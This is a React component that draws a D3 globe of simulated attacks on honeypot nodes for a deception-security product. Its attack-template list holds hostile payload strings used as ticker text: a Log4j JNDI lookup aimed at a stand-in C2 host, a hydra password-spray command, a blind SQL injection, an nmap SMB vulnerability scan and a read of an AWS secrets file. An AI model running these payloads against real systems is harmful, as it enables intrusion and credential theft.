import React, { useState, useEffect, useRef, useMemo } from 'react';
import * as d3 from 'd3';
import gsap from 'gsap';
import {
  Globe,
  Radio,
  Zap,
  ShieldAlert,
  Terminal,
  Activity,
  Filter,
  Layers,
  Pause,
  Play,
  RotateCw,
  Sparkles,
  ExternalLink,
  ChevronRight,
  Maximize2,
  AlertTriangle,
  Server,
} from 'lucide-react';
import {
  CYBER_LOCATIONS,
  WORLD_GEO_DATA,
  CyberLocation,
  LiveThreatAttack,
} from '../data/worldGeoData';

const ATTACK_TEMPLATES = [
  {
    vector: 'CVE-2024-Log4j-Variant RCE',
    mitreTtp: 'T1190 - Exploit Public App',
    severity: 'Critical' as const,
    payloadSnippet: '${jndi:ldap://c2.interceptor.cc:1389/Exploit}',
  },
  {
    vector: 'SSH Distributed Dictionary Spray',
    mitreTtp: 'T1110.001 - Password Spray',
    severity: 'Medium' as const,
    payloadSnippet: 'hydra -L root_users.txt -P rockyou.txt',
  },
  {
    vector: 'Blind SQLi Database Dump Probe',
    mitreTtp: 'T1190 - SQL Injection',
    severity: 'High' as const,
    payloadSnippet: "' UNION SELECT NULL, pg_sleep(5), version()--",
  },
  {
    vector: 'Lateral Movement SMB Null Session',
    mitreTtp: 'T1046 - Network Service Scan',
    severity: 'High' as const,
    payloadSnippet: 'nmap -sS -p 445 --script smb-vuln',
  },
  {
    vector: 'Honeytoken / AWS IAM Exfiltration',
    mitreTtp: 'T1552.001 - Credentials in Files',
    severity: 'Critical' as const,
    payloadSnippet: 'cat /var/data/AWS_SECRET_KEYS.env',
  },
];

export const GlobalThreatFeed: React.FC = () => {
  const [projectionMode, setProjectionMode] = useState<'globe' | 'heatmap'>('globe');
  const [selectedFilter, setSelectedFilter] = useState<'all' | 'critical' | 'canary' | 'zero-day'>('all');
  const [isPaused, setIsPaused] = useState<boolean>(false);
  const [activeAttacks, setActiveAttacks] = useState<LiveThreatAttack[]>([]);
  const [selectedNode, setSelectedNode] = useState<CyberLocation | null>(CYBER_LOCATIONS[0]);
  const [interceptedCount, setInterceptedCount] = useState<number>(4821);
  const [packetsPerSec, setPacketsPerSec] = useState<number>(3120);

  const svgRef = useRef<SVGSVGElement | null>(null);
  const containerRef = useRef<HTMLDivElement | null>(null);
  const countRef = useRef<HTMLSpanElement | null>(null);

  // Rotation state for the 3D globe [yaw, pitch, roll]
  const rotationRef = useRef<[number, number, number]>([-20, -15, 0]);
  const isDraggingRef = useRef<boolean>(false);
  const lastMousePos = useRef<[number, number]>([0, 0]);

  // Generate an attack event
  const spawnAttack = () => {
    const attackers = CYBER_LOCATIONS.filter((l) => l.type === 'attacker');
    const decoys = CYBER_LOCATIONS.filter((l) => l.type === 'decoy');

    const source = attackers[Math.floor(Math.random() * attackers.length)];
    const target = decoys[Math.floor(Math.random() * decoys.length)];
    const template = ATTACK_TEMPLATES[Math.floor(Math.random() * ATTACK_TEMPLATES.length)];

    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];

    const newAttack: LiveThreatAttack = {
      id: `ATK-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: timeStr,
      source,
      target,
      vector: template.vector,
      mitreTtp: template.mitreTtp,
      payloadSnippet: template.payloadSnippet,
      severity: template.severity,
      status: template.vector.includes('Honeytoken') ? 'Canary Tripped' : 'Silent Reroute',
      progress: 0,
    };

    setActiveAttacks((prev) => [newAttack, ...prev.slice(0, 14)]);
    setInterceptedCount((prev) => prev + 1);
  };

  // Setup attack generation interval
  useEffect(() => {
    if (isPaused) return;
    const interval = setInterval(() => {
      spawnAttack();
      setPacketsPerSec(2800 + Math.floor(Math.random() * 600));
    }, 2200);

    // Initial seed attacks
    if (activeAttacks.length === 0) {
      spawnAttack();
      setTimeout(spawnAttack, 500);
      setTimeout(spawnAttack, 1100);
    }

    return () => clearInterval(interval);
  }, [isPaused, activeAttacks.length]);

  // GSAP animation for the intercepted counter
  useEffect(() => {
    if (countRef.current) {
      gsap.fromTo(
        countRef.current,
        { scale: 1.15, color: '#05DF85' },
        { scale: 1, color: '#ffffff', duration: 0.4, ease: 'power2.out' }
      );
    }
  }, [interceptedCount]);

  // Filtered attacks
  const filteredAttacks = useMemo(() => {
    if (selectedFilter === 'critical') {
      return activeAttacks.filter((a) => a.severity === 'Critical');
    }
    if (selectedFilter === 'canary') {
      return activeAttacks.filter((a) => a.status === 'Canary Tripped');
    }
    if (selectedFilter === 'zero-day') {
      return activeAttacks.filter((a) => a.vector.includes('RCE') || a.vector.includes('Zero-Day'));
    }
    return activeAttacks;
  }, [activeAttacks, selectedFilter]);

  // Render D3 Globe / Heatmap
  useEffect(() => {
    if (!svgRef.current || !containerRef.current) return;

    const width = containerRef.current.clientWidth || 800;
    const height = Math.min(540, Math.max(380, width * 0.55));

    const svg = d3.select(svgRef.current);
    svg.attr('viewBox', `0 0 ${width} ${height}`);
    svg.selectAll('*').remove();

    // Definitions for glows, gradients, and filters
    const defs = svg.append('defs');

    // Atmosphere gradient for globe
    const atmosphereGrad = defs
      .append('radialGradient')
      .attr('id', 'atmosphere-gradient')
      .attr('cx', '50%')
      .attr('cy', '50%')
      .attr('r', '50%');

    atmosphereGrad
      .append('stop')
      .attr('offset', '70%')
      .attr('stop-color', '#0B0F17')
      .attr('stop-opacity', 0.85);

    atmosphereGrad
      .append('stop')
      .attr('offset', '95%')
      .attr('stop-color', '#05DF85')
      .attr('stop-opacity', 0.25);

    atmosphereGrad
      .append('stop')
      .attr('offset', '100%')
      .attr('stop-color', '#05DF85')
      .attr('stop-opacity', 0.6);

    // Arc trajectory gradient (red -> amber -> emerald handoff)
    const arcGrad = defs
      .append('linearGradient')
      .attr('id', 'attack-arc-gradient')
      .attr('gradientUnits', 'userSpaceOnUse');

    arcGrad.append('stop').attr('offset', '0%').attr('stop-color', '#EF4444');
    arcGrad.append('stop').attr('offset', '70%').attr('stop-color', '#F59E0B');
    arcGrad.append('stop').attr('offset', '100%').attr('stop-color', '#05DF85');

    // Glow filter
    const filter = defs.append('filter').attr('id', 'cyber-glow').attr('x', '-30%').attr('y', '-30%').attr('width', '160%').attr('height', '160%');
    filter.append('feGaussianBlur').attr('stdDeviation', '4').attr('result', 'blur');
    filter.append('feMerge').selectAll('feMergeNode').data(['blur', 'SourceGraphic']).enter().append('feMergeNode').attr('in', (d) => d);

    // Projection setup
    let projection: d3.GeoProjection;
    const radius = Math.min(width, height) * 0.42;

    if (projectionMode === 'globe') {
      projection = d3
        .geoOrthographic()
        .scale(radius)
        .translate([width / 2, height / 2])
        .rotate(rotationRef.current)
        .clipAngle(90);
    } else {
      projection = d3
        .geoEquirectangular()
        .scale(radius * 1.05)
        .translate([width / 2, height / 2]);
    }

    const pathGenerator = d3.geoPath(projection);

    // Main map canvas group
    const mapGroup = svg.append('g').attr('class', 'map-layer');

    // 1. Base sphere / background
    if (projectionMode === 'globe') {
      // Glow halo
      mapGroup
        .append('circle')
        .attr('cx', width / 2)
        .attr('cy', height / 2)
        .attr('r', radius + 4)
        .attr('fill', 'url(#atmosphere-gradient)')
        .attr('stroke', '#05DF85')
        .attr('stroke-width', 1.2)
        .attr('opacity', 0.7)
        .style('filter', 'drop-shadow(0 0 15px rgba(5,223,133,0.3))');

      // Sphere base
      mapGroup
        .append('path')
        .datum({ type: 'Sphere' } as any)
        .attr('d', pathGenerator)
        .attr('fill', '#090E17')
        .attr('stroke', '#05DF85')
        .attr('stroke-width', 0.5)
        .attr('opacity', 0.6);
    } else {
      // 2D Tactical Planar boundary
      mapGroup
        .append('rect')
        .attr('x', 20)
        .attr('y', 20)
        .attr('width', width - 40)
        .attr('height', height - 40)
        .attr('fill', '#080C14')
        .attr('stroke', '#1E293B')
        .attr('stroke-width', 1)
        .attr('rx', 12);
    }

    // 2. Graticule grid lines
    const graticule = d3.geoGraticule10();
    mapGroup
      .append('path')
      .datum(graticule)
      .attr('d', pathGenerator)
      .attr('fill', 'none')
      .attr('stroke', '#05DF85')
      .attr('stroke-width', 0.5)
      .attr('stroke-opacity', projectionMode === 'globe' ? 0.12 : 0.08)
      .attr('stroke-dasharray', '2,3');

    // 3. World Landmasses
    mapGroup
      .append('g')
      .attr('class', 'continents')
      .selectAll('path')
      .data(WORLD_GEO_DATA.features)
      .enter()
      .append('path')
      .attr('d', (d) => pathGenerator(d as any))
      .attr('fill', '#0E1726')
      .attr('stroke', '#05DF85')
      .attr('stroke-width', 0.8)
      .attr('stroke-opacity', 0.45)
      .attr('fill-opacity', 0.75)
      .style('filter', 'drop-shadow(0 0 3px rgba(5,223,133,0.1))');

    // 4. Attack Arcs (Great-Circle trajectories)
    const arcGroup = mapGroup.append('g').attr('class', 'attack-trajectories');

    filteredAttacks.slice(0, 6).forEach((attack) => {
      const src = attack.source.coordinates;
      const tgt = attack.target.coordinates;

      // Create great circle arc feature
      const arcGeo = {
        type: 'LineString',
        coordinates: [src, tgt],
      };

      const arcPathString = pathGenerator(arcGeo as any);
      if (!arcPathString) return;

      // Base trajectory line
      arcGroup
        .append('path')
        .attr('d', arcPathString)
        .attr('fill', 'none')
        .attr('stroke', attack.severity === 'Critical' ? '#EF4444' : '#F59E0B')
        .attr('stroke-width', attack.severity === 'Critical' ? 1.6 : 1.2)
        .attr('stroke-opacity', 0.7)
        .attr('stroke-dasharray', '4,3')
        .style('filter', 'url(#cyber-glow)');

      // Great circle interpolation to calculate packet position
      const interpolator = d3.geoInterpolate(src, tgt);
      // Sample 3 animated packets per active attack
      [0.35, 0.7, 0.95].forEach((posOffset) => {
        const intermediateCoord = interpolator(posOffset);
        const projected = projection(intermediateCoord);
        if (!projected) return;

        arcGroup
          .append('circle')
          .attr('cx', projected[0])
          .attr('cy', projected[1])
          .attr('r', 3)
          .attr('fill', posOffset > 0.6 ? '#05DF85' : posOffset > 0.3 ? '#F59E0B' : '#EF4444')
          .attr('stroke', '#ffffff')
          .attr('stroke-width', 1)
          .style('filter', 'drop-shadow(0 0 6px #05DF85)');
      });
    });

    // 5. Cyber Nodes (Attacker Origins & Decoy Pods)
    const nodesGroup = mapGroup.append('g').attr('class', 'cyber-nodes');

    CYBER_LOCATIONS.forEach((loc) => {
      const coords = projection(loc.coordinates);
      if (!coords) return; // Hidden on far side of 3D globe

      const isDecoy = loc.type === 'decoy';
      const isSelected = selectedNode?.id === loc.id;
      const nodeColor = isDecoy ? '#05DF85' : '#EF4444';

      const nodeG = nodesGroup
        .append('g')
        .attr('transform', `translate(${coords[0]}, ${coords[1]})`)
        .attr('class', 'cursor-pointer')
        .on('click', () => setSelectedNode(loc));

      // Outer animated ping ring
      nodeG
        .append('circle')
        .attr('r', isDecoy ? 9 : 7)
        .attr('fill', 'none')
        .attr('stroke', nodeColor)
        .attr('stroke-width', 1)
        .attr('opacity', 0.5)
        .style('filter', 'drop-shadow(0 0 5px ' + nodeColor + ')');

      // Solid core
      nodeG
        .append('circle')
        .attr('r', isSelected ? 5 : isDecoy ? 4 : 3.5)
        .attr('fill', nodeColor)
        .attr('stroke', '#ffffff')
        .attr('stroke-width', 1);

      // Label text
      if (width > 600) {
        nodeG
          .append('text')
          .attr('x', isDecoy ? 8 : -8)
          .attr('y', 3)
          .attr('text-anchor', isDecoy ? 'start' : 'end')
          .attr('fill', isDecoy ? '#34D399' : '#FCA5A5')
          .attr('font-size', '9px')
          .attr('font-family', 'JetBrains Mono, monospace')
          .attr('opacity', isSelected ? 1 : 0.75)
          .text(isDecoy ? `[DECOY] ${loc.name.split(' ')[0]}` : loc.country);
      }
    });

    // 6. Interactive Drag / Rotation Handling for 3D Globe
    if (projectionMode === 'globe') {
      const dragBehavior = d3
        .drag<SVGSVGElement, unknown>()
        .on('start', (event) => {
          isDraggingRef.current = true;
          lastMousePos.current = [event.x, event.y];
        })
        .on('drag', (event) => {
          const dx = event.x - lastMousePos.current[0];
          const dy = event.y - lastMousePos.current[1];
          lastMousePos.current = [event.x, event.y];

          const currentRot = rotationRef.current;
          // Invert horizontal direction for natural drag feel
          const newRot: [number, number, number] = [
            currentRot[0] + dx * 0.4,
            Math.max(-60, Math.min(60, currentRot[1] - dy * 0.4)),
            0,
          ];
          rotationRef.current = newRot;
          projection.rotate(newRot);

          // Update elements
          mapGroup.selectAll('path').attr('d', pathGenerator as any);
        })
        .on('end', () => {
          isDraggingRef.current = false;
        });

      svg.call(dragBehavior as any);
    }

    // Auto-rotation animation loop for globe when not dragging and not paused
    let animFrame: number;
    const rotateGlobe = () => {
      if (projectionMode === 'globe' && !isDraggingRef.current && !isPaused) {
        const currentRot = rotationRef.current;
        const newYaw = (currentRot[0] + 0.18) % 360;
        rotationRef.current = [newYaw, currentRot[1], currentRot[2]];
        projection.rotate(rotationRef.current);
        mapGroup.selectAll('path').attr('d', pathGenerator as any);
      }
      animFrame = requestAnimationFrame(rotateGlobe);
    };

    animFrame = requestAnimationFrame(rotateGlobe);
    return () => cancelAnimationFrame(animFrame);
  }, [projectionMode, filteredAttacks, selectedNode, isPaused]);

  // Center globe on selected node
  const handleFocusNode = (node: CyberLocation) => {
    setSelectedNode(node);
    if (projectionMode === 'globe') {
      gsap.to(rotationRef.current, {
        0: -node.coordinates[0],
        1: -node.coordinates[1],
        duration: 1.2,
        ease: 'power2.inOut',
      });
    }
  };

  return (
    <section
      id="global-threat-feed"
      className="py-20 md:py-28 relative bg-gradient-to-b from-[#0B0F17] via-[#080d19] to-[#0B0F17] border-t border-slate-800 overflow-hidden"
    >
      {/* Background ambient lighting */}
      <div className="absolute top-1/3 left-1/4 w-[500px] h-[500px] bg-emerald-500/10 rounded-full blur-[140px] pointer-events-none -z-10" />
      <div className="absolute bottom-10 right-1/4 w-[500px] h-[500px] bg-amber-600/10 rounded-full blur-[140px] pointer-events-none -z-10" />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-12">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded bg-[#0A1018] border border-emerald-500/40 text-xs font-mono text-emerald-300 mb-3">
              <span className="w-2 h-2 rounded-full bg-[#05DF85] animate-ping" />
              <span className="font-bold tracking-widest text-[#05DF85] uppercase text-[10px]">LIVE TELEMETRY INTERCEPTOR</span>
              <span className="text-slate-600">|</span>
              <span className="text-slate-400 text-[10px]">eBPF MESH STREAM</span>
            </div>
            <h2 className="font-display text-3xl sm:text-5xl md:text-6xl font-extrabold text-white tracking-tight uppercase">
              GLOBAL THREAT INTELLIGENCE{' '}
              <span className="text-[#05DF85] block mt-1 text-glow-emerald">
                &amp; REAL-TIME DECOY FEED
              </span>
            </h2>
            <p className="mt-2 text-sm sm:text-base text-slate-300 max-w-2xl">
              Watch real-time simulated cyber adversaries attempting zero-day exploits, password spraying, and lateral scans—silently shifted into TRINETRA X honeypod clusters across 6 global cloud regions.
            </p>
          </div>

          {/* Top Real-Time Stats HUD */}
          <div className="flex flex-wrap items-center gap-3 font-mono">
            <div className="p-3.5 rounded-lg tactical-panel corner-bracket">
              <div className="text-[10px] text-[#05DF85] uppercase tracking-wider font-bold">Intercepted Threats</div>
              <div className="font-display text-2xl sm:text-3xl font-bold text-white mt-0.5 flex items-center gap-2">
                <span ref={countRef}>{interceptedCount.toLocaleString()}</span>
                <span className="text-[10px] font-mono text-emerald-400 font-bold bg-emerald-950/80 px-1.5 py-0.5 rounded border border-emerald-500/30">100% Signal</span>
              </div>
            </div>

            <div className="p-3.5 rounded-lg tactical-panel corner-bracket">
              <div className="text-[10px] text-slate-400 uppercase tracking-wider font-bold">Inbound Socket Rate</div>
              <div className="font-display text-2xl sm:text-3xl font-bold text-[#05DF85] mt-0.5">
                {packetsPerSec.toLocaleString()} <span className="text-xs font-mono text-slate-400 font-normal">PPS</span>
              </div>
            </div>

            <div className="p-3.5 rounded-lg tactical-panel corner-bracket">
              <div className="text-[10px] text-amber-400 uppercase tracking-wider font-bold">Active Decoy Pods</div>
              <div className="font-display text-2xl sm:text-3xl font-bold text-amber-300 mt-0.5">
                128 <span className="text-xs font-mono text-slate-400 font-normal">Online</span>
              </div>
            </div>
          </div>
        </div>

        {/* Interactive Controls Bar */}
        <div className="mb-6 p-4 rounded-2xl glass-card flex flex-wrap items-center justify-between gap-4">
          {/* Projection Mode Switcher (Globe vs 2D Tactical Planar) */}
          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-slate-400 hidden sm:inline">Projection:</span>
            <div className="flex rounded-xl bg-slate-950 p-1 border border-white/10">
              <button
                onClick={() => setProjectionMode('globe')}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all cursor-pointer ${
                  projectionMode === 'globe'
                    ? 'bg-emerald-500/20 text-[#05DF85] border border-emerald-500/40 shadow-[0_0_10px_rgba(5,223,133,0.3)]'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                <Globe className="w-3.5 h-3.5" />
                <span>3D Orbital Globe</span>
              </button>

              <button
                onClick={() => setProjectionMode('heatmap')}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all cursor-pointer ${
                  projectionMode === 'heatmap'
                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 shadow-[0_0_10px_rgba(245,158,11,0.3)]'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                <Layers className="w-3.5 h-3.5" />
                <span>2D Tactical Heatmap</span>
              </button>
            </div>
          </div>

          {/* Threat Filter Pills */}
          <div className="flex items-center gap-2 overflow-x-auto no-scrollbar">
            <span className="text-xs font-mono text-slate-400 flex items-center gap-1 shrink-0">
              <Filter className="w-3 h-3 text-[#05DF85]" />
              <span className="hidden md:inline">Filter:</span>
            </span>

            {[
              { id: 'all', label: 'All Incidents' },
              { id: 'critical', label: 'Critical Only' },
              { id: 'canary', label: 'Canary Honeyfiles' },
              { id: 'zero-day', label: 'Zero-Day RCE' },
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setSelectedFilter(f.id as any)}
                className={`px-2.5 py-1 rounded-md text-xs font-mono whitespace-nowrap transition-all border cursor-pointer ${
                  selectedFilter === f.id
                    ? 'bg-emerald-950/70 border-emerald-400 text-[#05DF85]'
                    : 'bg-slate-950/60 border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>

          {/* Stream Controls */}
          <div className="flex items-center gap-2">
            <button
              onClick={() => setIsPaused(!isPaused)}
              className={`p-2 rounded-lg text-xs font-mono border transition-colors flex items-center gap-1.5 cursor-pointer ${
                isPaused
                  ? 'bg-amber-950/60 border-amber-500/50 text-amber-300'
                  : 'bg-slate-950 border-slate-800 text-slate-300 hover:border-emerald-500/40'
              }`}
              title={isPaused ? 'Resume live simulation' : 'Pause live simulation'}
            >
              {isPaused ? <Play className="w-3.5 h-3.5" /> : <Pause className="w-3.5 h-3.5" />}
              <span className="hidden sm:inline">{isPaused ? 'Resume' : 'Pause'}</span>
            </button>

            <button
              onClick={spawnAttack}
              className="px-3 py-1.5 rounded-lg bg-[#05DF85] hover:bg-[#00F59B] text-slate-950 font-mono text-xs font-bold transition-all shadow-[0_0_15px_rgba(5,223,133,0.4)] flex items-center gap-1.5 cursor-pointer"
            >
              <Zap className="w-3.5 h-3.5" />
              <span>Surge Attack</span>
            </button>
          </div>
        </div>

        {/* Main Interactive Stage Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* Globe Canvas Container (Span 8) */}
          <div
            ref={containerRef}
            className="lg:col-span-8 rounded-2xl glass-card border border-white/10 p-4 sm:p-6 shadow-[0_0_50px_rgba(5,223,133,0.12)] relative overflow-hidden"
          >
            {/* Top Radar & Coordinates HUD */}
            <div className="flex items-center justify-between pb-3 mb-2 border-b border-white/10 text-xs font-mono">
              <div className="flex items-center gap-2 text-[#05DF85]">
                <Radio className="w-4 h-4 animate-pulse" />
                <span className="font-bold">DECEPTION RADAR RETICLE</span>
                <span className="text-[10px] text-slate-400 hidden sm:inline">| Drag to Rotate Globe</span>
              </div>
              <div className="flex items-center gap-3 text-slate-400 text-[11px]">
                <span>LAT: 38.89° N</span>
                <span>LON: 77.03° W</span>
                <span className="px-2 py-0.5 rounded bg-emerald-950 text-[#05DF85] border border-emerald-500/30 font-bold">
                  {projectionMode === 'globe' ? 'ORTHOGRAPHIC 3D' : 'EQUIRECTANGULAR 2D'}
                </span>
              </div>
            </div>

            {/* D3 SVG Canvas */}
            <div className="w-full flex items-center justify-center relative select-none">
              <svg
                ref={svgRef}
                className="w-full h-auto max-h-[500px] cursor-grab active:cursor-grabbing"
              />

              {/* In-canvas quick instruction badge */}
              {projectionMode === 'globe' && (
                <div className="absolute bottom-3 left-3 px-2.5 py-1 rounded-lg bg-slate-950/80 border border-white/10 text-[10px] font-mono text-slate-400 pointer-events-none backdrop-blur-sm">
                  Click and drag globe to rotate • Click nodes to inspect
                </div>
              )}
            </div>

            {/* Bottom Quick-Jump Decoy Mesh Nodes */}
            <div className="mt-4 pt-3 border-t border-white/10 flex items-center gap-2 overflow-x-auto no-scrollbar">
              <span className="text-[11px] font-mono text-slate-400 shrink-0 flex items-center gap-1">
                <Server className="w-3.5 h-3.5 text-[#05DF85]" />
                <span>Jump to Decoy Node:</span>
              </span>
              {CYBER_LOCATIONS.filter((l) => l.type === 'decoy').map((decoy) => (
                <button
                  key={decoy.id}
                  onClick={() => handleFocusNode(decoy)}
                  className={`px-2.5 py-1 rounded-lg text-[11px] font-mono whitespace-nowrap transition-colors border cursor-pointer ${
                    selectedNode?.id === decoy.id
                      ? 'bg-emerald-950 text-[#05DF85] border-emerald-400'
                      : 'bg-slate-900/60 text-slate-400 border-white/10 hover:text-white'
                  }`}
                >
                  {decoy.name.split(' ')[0]} ({decoy.asnOrPod.split('/')[0].trim()})
                </button>
              ))}
            </div>
          </div>

          {/* Right Live Stream Sidebar & Node Inspector (Span 4) */}
          <div className="lg:col-span-4 space-y-6">
            {/* Selected Node Telemetry Dossier */}
            {selectedNode && (
              <div className="rounded-2xl glass-card border border-white/10 p-5 font-mono text-xs shadow-xl">
                <div className="flex items-center justify-between pb-3 mb-3 border-b border-white/10">
                  <div className="flex items-center gap-2">
                    <div
                      className={`w-3 h-3 rounded-full ${
                        selectedNode.type === 'decoy' ? 'bg-[#05DF85]' : 'bg-red-400'
                      } animate-pulse`}
                    />
                    <span className="font-bold text-white uppercase tracking-wide">
                      {selectedNode.type === 'decoy' ? 'Decoy Honeypod Node' : 'Simulated Adversary'}
                    </span>
                  </div>
                  <span
                    className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                      selectedNode.type === 'decoy'
                        ? 'bg-emerald-950 text-[#05DF85] border border-emerald-500/40'
                        : 'bg-red-950 text-red-400 border border-red-800/40'
                    }`}
                  >
                    {selectedNode.type === 'decoy' ? 'ARMED & ACTIVE' : selectedNode.threatLevel || 'MALICIOUS'}
                  </span>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-slate-400">
                    <span>Target/Origin:</span>
                    <span className="text-white font-bold">{selectedNode.name}</span>
                  </div>
                  <div className="flex justify-between text-slate-400">
                    <span>IP / Socket:</span>
                    <span className="text-emerald-300 font-bold">{selectedNode.ip}</span>
                  </div>
                  <div className="flex justify-between text-slate-400">
                    <span>Cluster / ASN:</span>
                    <span className="text-slate-200">{selectedNode.asnOrPod}</span>
                  </div>
                  <div className="flex justify-between text-slate-400">
                    <span>Coordinates:</span>
                    <span className="text-slate-400">
                      {selectedNode.coordinates[1].toFixed(2)}°N, {selectedNode.coordinates[0].toFixed(2)}°E
                    </span>
                  </div>
                  {selectedNode.type === 'decoy' ? (
                    <div className="pt-2 border-t border-white/10 text-[11px] text-emerald-400 flex items-center justify-between font-bold">
                      <span>eBPF Socket Splicer:</span>
                      <span>&lt; 0.38ms handoff</span>
                    </div>
                  ) : (
                    <div className="pt-2 border-t border-white/10 text-[11px] text-amber-300 flex items-center justify-between font-bold">
                      <span>Attacker Status:</span>
                      <span>Trapped in Sandbox</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Live Streaming Attack Ticker Feed */}
            <div className="rounded-2xl glass-card border border-white/10 p-4 font-mono text-xs">
              <div className="flex items-center justify-between pb-3 mb-3 border-b border-white/10">
                <div className="flex items-center gap-2 text-[#05DF85]">
                  <Activity className="w-4 h-4" />
                  <span className="font-bold uppercase tracking-wider">Live Adversary Stream</span>
                </div>
                <span className="text-[10px] text-slate-400">Auto-updating</span>
              </div>

              <div className="space-y-2.5 max-h-[320px] overflow-y-auto pr-1">
                {filteredAttacks.map((atk) => (
                  <div
                    key={atk.id}
                    className="p-2.5 rounded-xl bg-slate-950/80 border border-white/[0.08] hover:border-emerald-500/40 transition-colors space-y-1"
                  >
                    <div className="flex items-center justify-between text-[11px]">
                      <span className="text-white font-bold truncate max-w-[170px]">
                        {atk.vector}
                      </span>
                      <span
                        className={`text-[9px] px-1.5 py-0.5 rounded font-bold ${
                          atk.severity === 'Critical'
                            ? 'bg-rose-950 text-rose-400 border border-rose-800/40'
                            : 'bg-amber-950 text-amber-400 border border-amber-800/40'
                        }`}
                      >
                        {atk.severity}
                      </span>
                    </div>

                    <div className="text-[10px] text-slate-400 flex items-center justify-between">
                      <span>{atk.source.country} ➔</span>
                      <span className="text-[#05DF85] font-medium">{atk.target.name.split(' ')[0]}</span>
                    </div>

                    <div className="text-[10px] text-slate-400 truncate bg-slate-950 px-2 py-0.5 rounded border border-white/[0.06]">
                      <code>{atk.payloadSnippet}</code>
                    </div>

                    <div className="flex items-center justify-between text-[9px] pt-1 text-slate-500">
                      <span>{atk.mitreTtp.split('-')[0].trim()}</span>
                      <span className="text-emerald-400 font-bold">{atk.status}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
